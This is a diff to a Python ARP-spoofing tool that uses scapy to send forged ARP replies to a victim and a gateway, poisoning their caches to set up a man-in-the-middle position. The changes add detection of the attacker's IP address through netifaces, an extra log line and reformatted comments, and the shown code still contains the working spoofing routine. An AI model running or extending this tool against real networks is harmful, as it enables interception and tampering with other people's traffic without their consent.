@@ -1,11 +1,11 @@
 #!/usr/bin/env python3
 
 from scapy.all import Ether, ARP, srp, sendp
+from netifaces import ifaddresses, AF_INET
 from getmac import get_mac_address
 from time import sleep
 from pwn import log
 import argparse
-
 
 ################################################################################
 #                                                                              #
@@ -36,8 +36,7 @@ def banner():
     """
         Display the script banner
     """
-    print("""\x1b[33m
-                                                 _____             
+    print("""\x1b[33m                                                 _____             
 _____ _____________  ____________   ____   _____/ ____\\___________ 
 \\__  \\\\_  __ \\____ \\/  ___/\\____ \\ /  _ \\ /  _ \\   __\\/ __ \\_  __ \\
  / __ \\|  | \\/  |_> >___ \\ |  |_> >  <_> |  <_> )  | \\  ___/|  | \\/
@@ -82,17 +81,20 @@ def get_mac(ip: str) -> str:
 
 
 class ACP:
-    def __init__(self, gateway_ip: str, victim_ip: str, attacker_mac: str, delay: int) -> None:
+    def __init__(self, gateway_ip: str, victim_ip: str, attacker_mac: str, attacker_ip: str, delay: int) -> None:
         self.gateway_ip = gateway_ip 
         self.gateway_mac = get_mac(self.gateway_ip)
         
         self.victim_ip = victim_ip 
         self.victim_mac = get_mac(self.victim_ip)
         
+        self.attacker_ip = attacker_ip
         self.attacker_mac = attacker_mac
         self.delay = delay
 
     def show_mac(self) -> None:
+
+        log.info(f"You     : \x1b[1m\x1b[35m[\x1b[0m {self.attacker_ip}\x1b[0m \x1b[1m\x1b[35m][ \x1b[0m{self.attacker_mac}\x1b[0m \x1b[1m\x1b[35m]\x1b[0m")
         log.info(f"Target  : \x1b[1m\x1b[35m[\x1b[0m {self.victim_ip}\x1b[0m \x1b[1m\x1b[35m][ \x1b[0m{self.victim_mac}\x1b[0m \x1b[1m\x1b[35m]\x1b[0m")
         log.info(f"Gateway : \x1b[1m\x1b[35m[\x1b[0m {self.gateway_ip}\x1b[0m \x1b[1m\x1b[35m][ \x1b[0m{self.gateway_mac}\x1b[0m \x1b[1m\x1b[35m]\x1b[0m")
         
@@ -111,10 +113,10 @@ class ACP:
 
         sendp(ARP(
             op="is-at",         # ARP reply
-            pdst=dst_ip,     # Destination IP
-            hwdst=dst_mac,   # Destination MAC
-            psrc=src_ip,    # Source IP (The ip we are spoofing)
-            hwsrc=src_mac, # Source MAC (Our mac address)
+            pdst=dst_ip,        # Destination IP
+            hwdst=dst_mac,      # Destination MAC
+            psrc=src_ip,        # Source IP (The ip we are spoofing)
+            hwsrc=src_mac,      # Source MAC (Our mac address)
         ), verbose=False )
 
     def poison_arp(self) -> None:
@@ -170,14 +172,13 @@ if __name__ == "__main__":
     gateway_ip, victim_ip, delay, iname = parse_args()
     attacker_mac = get_mac_address(interface=iname)
 
-
     if(attacker_mac == None):
         log.critical(f"Could not retrieve MAC address for interface {iname}")
         exit()
 
     try:
         gathering = log.waitfor("Gathering mac addresses")
-        acp = ACP(gateway_ip=gateway_ip, victim_ip=victim_ip, attacker_mac=attacker_mac, delay=delay)
+        acp = ACP(gateway_ip=gateway_ip, victim_ip=victim_ip, attacker_ip=ifaddresses(iname)[AF_INET][0]['addr'], attacker_mac=attacker_mac, delay=delay)
         gathering.success("ok")
        
         acp.run()
